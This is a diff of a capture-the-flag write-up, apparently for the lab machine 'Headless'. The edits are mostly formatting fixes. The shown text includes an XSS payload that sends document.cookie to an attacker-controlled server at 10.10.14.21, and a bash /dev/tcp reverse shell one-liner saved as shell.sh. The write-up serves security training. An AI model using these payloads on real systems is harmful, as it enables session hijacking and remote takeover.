@@ -39,12 +39,16 @@ The `/support` URI allows payload injection, triggering a hacking protection ale
 ### User flag
 
 ### Cookie stealing
-I looked for how to steal cookies and found this [article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e). First, I initiated a Python server on port 1234 using the command 
+I looked for how to steal cookies and found this [article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e). First, I initiated a Python server on port 1234 using the command:
+
 `python3 -m http.server 1234`
+
 Then, I captured an HTTP request and sent it to Repeater. 
 Within Repeater, I injected a cookie-stealing payload into reflected headers like "User-Agent", "Accept" and "message" until I got a response. 
+
 `<script>var i=new Image(); i.src="http://10.10.14.21:1234/?cookie="+btoa(document.cookie);</script>`
-I repeated this process until our server intercepted and processed the injected payload.
+
+I repeated this process until the server intercepted and processed the injected payload.
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(130).png)
 
@@ -62,8 +66,10 @@ I forwarded the request and got this page.
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(133).png)
 
-I attempted to gain access to a shell while being behind a protected page. To do so, I created a pyload file named `shell.sh` containing the following code:
+I attempted to gain access to a shell while being behind a protected page. To do so, I created a payload file named `shell.sh` containing the following code:
+
 `/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.21/1333 0>&1'`
+
 Then set up a listener on port 1333
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(141).png)
